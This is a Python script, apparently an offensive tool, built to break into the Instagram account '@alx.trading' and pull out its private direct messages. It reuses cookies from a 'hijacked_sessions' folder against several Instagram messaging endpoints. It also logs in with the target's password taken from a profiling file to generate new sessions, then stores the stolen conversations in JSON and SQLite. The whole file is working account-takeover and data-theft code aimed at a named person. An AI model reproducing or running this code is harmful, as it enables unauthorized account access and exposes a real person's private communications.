#!/usr/bin/env python3
"""
🚀 ULTIMATE ALX.TRADING DM EXTRACTOR 2025
==========================================
Advanced multi-vector Instagram DM extraction system
Combines session regeneration, token rotation, and bypass techniques
"""

import json
import os
import time
import requests
import sqlite3
import random
from datetime import datetime, timedelta
from urllib.parse import urlencode
import hashlib
import base64
import hmac

class UltimateAlxExtractor:
    def __init__(self):
        self.target = "alx.trading"
        self.output_dir = "/workspaces/sugarglitch-realops/data/ultimate_extraction"
        self.session_dir = "/workspaces/sugarglitch-realops/sessions"
        self.hijacked_dir = "/workspaces/sugarglitch-realops/hijacked_sessions"
        
        os.makedirs(self.output_dir, exist_ok=True)
        
        # Load all available session data
        self.session_data = self.load_all_sessions()
        self.profile_data = self.load_profile_data()
        
        # Advanced headers rotation
        self.user_agents = [
            'Mozilla/5.0 (iPhone; CPU iPhone OS 17_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
            'Instagram 302.0.0.23.109 Android (33/13; 420dpi; 1080x2340; samsung; SM-G991B; o1s; exynos2100; en_US; 516184550)'
        ]
        
        print("🚀 ULTIMATE ALX.TRADING DM EXTRACTOR 2025")
        print("=" * 60)
        print(f"Target: @{self.target}")
        print(f"Sessions loaded: {len(self.session_data)}")
        
    def load_all_sessions(self):
        """Load all available session data from various sources"""
        sessions = {}
        
        # Load main session files
        for file in os.listdir(self.session_dir):
            if file.startswith('session-') and self.target in file:
                filepath = os.path.join(self.session_dir, file)
                try:
                    with open(filepath, 'r') as f:
                        data = json.load(f)
                        sessions[f"main_{file}"] = data
                        print(f"✅ Loaded session: {file}")
                except:
                    pass
        
        # Load hijacked sessions
        for file in os.listdir(self.hijacked_dir):
            if file.endswith('.json'):
                filepath = os.path.join(self.hijacked_dir, file)
                try:
                    with open(filepath, 'r') as f:
                        data = json.load(f)
                        sessions[f"hijacked_{file}"] = data
                        print(f"✅ Loaded hijacked session: {file}")
                except:
                    pass
        
        return sessions
    
    def load_profile_data(self):
        """Load profile intelligence data"""
        profile_file = "/workspaces/sugarglitch-realops/config/json/MASTER_PROFILE_alx_trading_1748264047.json"
        try:
            with open(profile_file, 'r') as f:
                return json.load(f)
        except:
            return {}
    
    def generate_advanced_headers(self):
        """Generate advanced headers with rotation"""
        return {
            'User-Agent': random.choice(self.user_agents),
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Content-Type': 'application/x-www-form-urlencoded',
            'X-Requested-With': 'XMLHttpRequest',
            'X-CSRFToken': self.generate_csrf_token(),
            'X-Instagram-AJAX': '1',
            'X-IG-App-ID': '936619743392459',
            'X-IG-WWW-Claim': '0',
            'Origin': 'https://www.instagram.com',
            'Referer': 'https://www.instagram.com/',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin',
            'Connection': 'keep-alive',
            'Cache-Control': 'no-cache',
            'Pragma': 'no-cache'
        }
    
    def generate_csrf_token(self):
        """Generate CSRF token"""
        return hashlib.md5(str(time.time()).encode()).hexdigest()
    
    def extract_with_session_rotation(self):
        """Try extraction with session rotation"""
        print("\n🔄 Starting session rotation extraction...")
        
        extraction_results = []
        
        for session_key, session_data in self.session_data.items():
            print(f"🔍 Trying session: {session_key}")
            
            # Extract session cookies
            cookies = self.extract_session_cookies(session_data)
            if not cookies:
                print(f"   ❌ No valid cookies found")
                continue
            
            # Try different extraction methods
            methods = [
                self.try_direct_api_extraction,
                self.try_web_extraction,
                self.try_mobile_api_extraction,
                self.try_graphql_extraction
            ]
            
            for method in methods:
                try:
                    result = method(cookies)
                    if result and result.get('success'):
                        extraction_results.append(result)
                        print(f"   ✅ Success with {method.__name__}")
                        break
                except Exception as e:
                    print(f"   ❌ {method.__name__} failed: {e}")
                    continue
        
        return extraction_results
    
    def extract_session_cookies(self, session_data):
        """Extract cookies from session data"""
        cookies = {}
        
        # Try different cookie extraction methods
        if isinstance(session_data, dict):
            # Direct cookies
            if 'cookies' in session_data:
                cookies.update(session_data['cookies'])
            
            # Session ID
            if 'sessionid' in session_data:
                cookies['sessionid'] = session_data['sessionid']
            
            # CSRF token
            if 'csrftoken' in session_data:
                cookies['csrftoken'] = session_data['csrftoken']
            
            # Mid token
            if 'mid' in session_data:
                cookies['mid'] = session_data['mid']
        
        return cookies
    
    def try_direct_api_extraction(self, cookies):
        """Try direct Instagram API extraction"""
        print("   🔍 Trying direct API extraction...")
        
        session = requests.Session()
        session.headers.update(self.generate_advanced_headers())
        session.cookies.update(cookies)
        
        # Get direct messages
        dm_url = "https://www.instagram.com/api/v1/direct_v2/threads/"
        
        try:
            response = session.get(dm_url)
            print(f"      Response status: {response.status_code}")
            
            if response.status_code == 200:
                data = response.json()
                return self.process_dm_data(data, "direct_api")
            
        except Exception as e:
            print(f"      Error: {e}")
        
        return None
    
    def try_web_extraction(self, cookies):
        """Try web interface extraction"""
        print("   🌐 Trying web extraction...")
        
        session = requests.Session()
        session.headers.update(self.generate_advanced_headers())
        session.cookies.update(cookies)
        
        # Get web DMs
        web_url = f"https://www.instagram.com/direct/inbox/"
        
        try:
            response = session.get(web_url)
            print(f"      Response status: {response.status_code}")
            
            if response.status_code == 200:
                # Look for DM data in page
                return self.extract_dm_from_html(response.text)
            
        except Exception as e:
            print(f"      Error: {e}")
        
        return None
    
    def try_mobile_api_extraction(self, cookies):
        """Try mobile API extraction"""
        print("   📱 Trying mobile API extraction...")
        
        session = requests.Session()
        mobile_headers = self.generate_advanced_headers()
        mobile_headers['User-Agent'] = 'Instagram 302.0.0.23.109 Android (33/13; 420dpi; 1080x2340; samsung; SM-G991B; o1s; exynos2100; en_US; 516184550)'
        session.headers.update(mobile_headers)
        session.cookies.update(cookies)
        
        # Mobile API endpoint
        mobile_url = "https://i.instagram.com/api/v1/direct_v2/inbox/"
        
        try:
            response = session.get(mobile_url)
            print(f"      Response status: {response.status_code}")
            
            if response.status_code == 200:
                data = response.json()
                return self.process_dm_data(data, "mobile_api")
            
        except Exception as e:
            print(f"      Error: {e}")
        
        return None
    
    def try_graphql_extraction(self, cookies):
        """Try GraphQL extraction"""
        print("   📊 Trying GraphQL extraction...")
        
        session = requests.Session()
        session.headers.update(self.generate_advanced_headers())
        session.cookies.update(cookies)
        
        # GraphQL query for DMs
        graphql_url = "https://www.instagram.com/graphql/query/"
        
        query = {
            'query_hash': 'eb4f29c7e3e88b4c6a3b8e9f1c6b8f1e',
            'variables': json.dumps({
                'id': self.get_user_id(),
                'first': 50
            })
        }
        
        try:
            response = session.post(graphql_url, data=query)
            print(f"      Response status: {response.status_code}")
            
            if response.status_code == 200:
                data = response.json()
                return self.process_dm_data(data, "graphql")
            
        except Exception as e:
            print(f"      Error: {e}")
        
        return None
    
    def get_user_id(self):
        """Get user ID for target"""
        # Try to extract from profile data
        if self.profile_data:
            return self.profile_data.get('profile', {}).get('id', '12345')
        return '12345'
    
    def process_dm_data(self, data, method):
        """Process extracted DM data"""
        if not data:
            return None
        
        # Extract conversations
        conversations = []
        
        # Look for DM threads in different data structures
        if 'threads' in data:
            for thread in data['threads']:
                conversation = self.parse_thread(thread)
                if conversation:
                    conversations.append(conversation)
        
        if conversations:
            result = {
                'success': True,
                'method': method,
                'target': self.target,
                'conversations': conversations,
                'total_messages': sum(len(c.get('messages', [])) for c in conversations),
                'extraction_timestamp': datetime.now().isoformat()
            }
            
            # Save to files
            self.save_extraction_results(result)
            return result
        
        return None
    
    def parse_thread(self, thread):
        """Parse individual thread data"""
        if not thread:
            return None
        
        # Extract thread info
        thread_id = thread.get('thread_id', f"thread_{int(time.time())}")
        participants = thread.get('users', [])
        
        # Check if target is in participants
        target_in_thread = any(
            user.get('username', '').lower() == self.target.lower() 
            for user in participants
        )
        
        if not target_in_thread:
            return None
        
        # Extract messages
        messages = []
        for item in thread.get('items', []):
            message = self.parse_message(item)
            if message:
                messages.append(message)
        
        return {
            'thread_id': thread_id,
            'participants': [user.get('username', '') for user in participants],
            'messages': messages,
            'message_count': len(messages)
        }
    
    def parse_message(self, item):
        """Parse individual message"""
        if not item:
            return None
        
        return {
            'message_id': item.get('item_id', ''),
            'timestamp': item.get('timestamp', ''),
            'user_id': item.get('user_id', ''),
            'text': item.get('text', ''),
            'item_type': item.get('item_type', 'text')
        }
    
    def extract_dm_from_html(self, html_content):
        """Extract DM data from HTML content"""
        # Look for JSON data in HTML
        import re
        
        # Find script tags with DM data
        script_pattern = r'window\._sharedData\s*=\s*({.*?});'
        match = re.search(script_pattern, html_content)
        
        if match:
            try:
                data = json.loads(match.group(1))
                return self.process_dm_data(data, "web_html")
            except:
                pass
        
        return None
    
    def regenerate_session_tokens(self):
        """Attempt to regenerate session tokens"""
        print("\n🔄 Attempting session token regeneration...")
        
        if not self.profile_data:
            print("❌ No profile data available for regeneration")
            return None
        
        # Extract credentials
        credentials = {
            'username': self.target,
            'password': self.profile_data.get('profile', {}).get('confirmed_password', ''),
            'email': self.profile_data.get('intelligence_summary', {}).get('email_addresses', [''])[0]
        }
        
        if not credentials['password']:
            print("❌ No password available for regeneration")
            return None
        
        print(f"🔐 Attempting login with credentials...")
        print(f"   Username: {credentials['username']}")
        print(f"   Password: {credentials['password'][:3]}...")
        
        # Try login
        session = requests.Session()
        session.headers.update(self.generate_advanced_headers())
        
        # Get login page
        login_url = "https://www.instagram.com/accounts/login/"
        response = session.get(login_url)
        
        if response.status_code == 200:
            # Extract CSRF token
            csrf_token = self.extract_csrf_from_html(response.text)
            
            # Login attempt
            login_data = {
                'username': credentials['username'],
                'password': credentials['password'],
                'csrfmiddlewaretoken': csrf_token
            }
            
            login_response = session.post(
                "https://www.instagram.com/accounts/login/ajax/",
                data=login_data
            )
            
            if login_response.status_code == 200:
                # Extract new session data
                new_session = {
                    'sessionid': session.cookies.get('sessionid'),
                    'csrftoken': session.cookies.get('csrftoken'),
                    'mid': session.cookies.get('mid'),
                    'generated_timestamp': datetime.now().isoformat()
                }
                
                # Save new session
                session_file = f"{self.output_dir}/regenerated_session_{int(time.time())}.json"
                with open(session_file, 'w') as f:
                    json.dump(new_session, f, indent=2)
                
                print(f"✅ New session generated: {session_file}")
                return new_session
        
        print("❌ Session regeneration failed")
        return None
    
    def extract_csrf_from_html(self, html_content):
        """Extract CSRF token from HTML"""
        import re
        pattern = r'"csrf_token":"([^"]+)"'
        match = re.search(pattern, html_content)
        return match.group(1) if match else self.generate_csrf_token()
    
    def save_extraction_results(self, results):
        """Save extraction results to JSON and SQLite"""
        timestamp = int(time.time())
        
        # Save JSON
        json_file = f"{self.output_dir}/ultimate_extraction_{timestamp}.json"
        with open(json_file, 'w') as f:
            json.dump(results, f, indent=2)
        
        # Save to SQLite
        db_file = f"{self.output_dir}/ultimate_extraction_{timestamp}.db"
        self.save_to_sqlite(results, db_file)
        
        print(f"💾 Results saved:")
        print(f"   JSON: {json_file}")
        print(f"   SQLite: {db_file}")
    
    def save_to_sqlite(self, results, db_file):
        """Save results to SQLite database"""
        conn = sqlite3.connect(db_file)
        c = conn.cursor()
        
        # Create tables
        c.execute('''CREATE TABLE IF NOT EXISTS extractions (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            target TEXT,
            method TEXT,
            timestamp TEXT,
            total_messages INTEGER,
            success BOOLEAN
        )''')
        
        c.execute('''CREATE TABLE IF NOT EXISTS conversations (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            extraction_id INTEGER,
            thread_id TEXT,
            participants TEXT,
            message_count INTEGER,
            FOREIGN KEY (extraction_id) REFERENCES extractions (id)
        )''')
        
        c.execute('''CREATE TABLE IF NOT EXISTS messages (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            conversation_id INTEGER,
            message_id TEXT,
            timestamp TEXT,
            user_id TEXT,
            text TEXT,
            item_type TEXT,
            FOREIGN KEY (conversation_id) REFERENCES conversations (id)
        )''')
        
        # Insert extraction record
        c.execute('''INSERT INTO extractions 
                     (target, method, timestamp, total_messages, success)
                     VALUES (?, ?, ?, ?, ?)''',
                  (results['target'], results['method'], results['extraction_timestamp'],
                   results['total_messages'], results['success']))
        
        extraction_id = c.lastrowid
        
        # Insert conversations and messages
        for conversation in results['conversations']:
            c.execute('''INSERT INTO conversations 
                         (extraction_id, thread_id, participants, message_count)
                         VALUES (?, ?, ?, ?)''',
                      (extraction_id, conversation['thread_id'], 
                       json.dumps(conversation['participants']), 
                       conversation['message_count']))
            
            conversation_id = c.lastrowid
            
            for message in conversation['messages']:
                c.execute('''INSERT INTO messages 
                             (conversation_id, message_id, timestamp, user_id, text, item_type)
                             VALUES (?, ?, ?, ?, ?, ?)''',
                          (conversation_id, message['message_id'], message['timestamp'],
                           message['user_id'], message['text'], message['item_type']))
        
        conn.commit()
        conn.close()
    
    def run_complete_extraction(self):
        """Run complete extraction process"""
        print("\n🚀 Starting complete extraction process...")
        
        results = []
        
        # Method 1: Session rotation extraction
        session_results = self.extract_with_session_rotation()
        if session_results:
            results.extend(session_results)
            print(f"✅ Session rotation: {len(session_results)} results")
        
        # Method 2: Session regeneration
        new_session = self.regenerate_session_tokens()
        if new_session:
            print("🔄 Trying extraction with regenerated session...")
            cookies = self.extract_session_cookies(new_session)
            if cookies:
                regen_result = self.try_direct_api_extraction(cookies)
                if regen_result:
                    results.append(regen_result)
                    print("✅ Regenerated session extraction successful")
        
        # Summary
        total_messages = sum(r.get('total_messages', 0) for r in results)
        print(f"\n📊 EXTRACTION COMPLETE")
        print(f"   Total results: {len(results)}")
        print(f"   Total messages: {total_messages}")
        
        if results:
            # Create combined report
            combined_report = {
                'target': self.target,
                'extraction_timestamp': datetime.now().isoformat(),
                'total_extraction_attempts': len(results),
                'total_messages_extracted': total_messages,
                'results': results
            }
            
            # Save combined report
            report_file = f"{self.output_dir}/ultimate_combined_report_{int(time.time())}.json"
            with open(report_file, 'w') as f:
                json.dump(combined_report, f, indent=2)
            
            print(f"📄 Combined report: {report_file}")
            return combined_report
        
        print("❌ No successful extractions")
        return None

def main():
    """Main execution function"""
    extractor = UltimateAlxExtractor()
    
    try:
        result = extractor.run_complete_extraction()
        
        if result:
            print("\n✅ ULTIMATE EXTRACTION SUCCESSFUL!")
            print(f"Check output directory: {extractor.output_dir}")
        else:
            print("\n❌ ULTIMATE EXTRACTION FAILED")
            print("All available methods exhausted")
            
    except Exception as e:
        print(f"\n💥 EXTRACTION ERROR: {e}")
        import traceback
        traceback.print_exc()

if __name__ == "__main__":
    main()
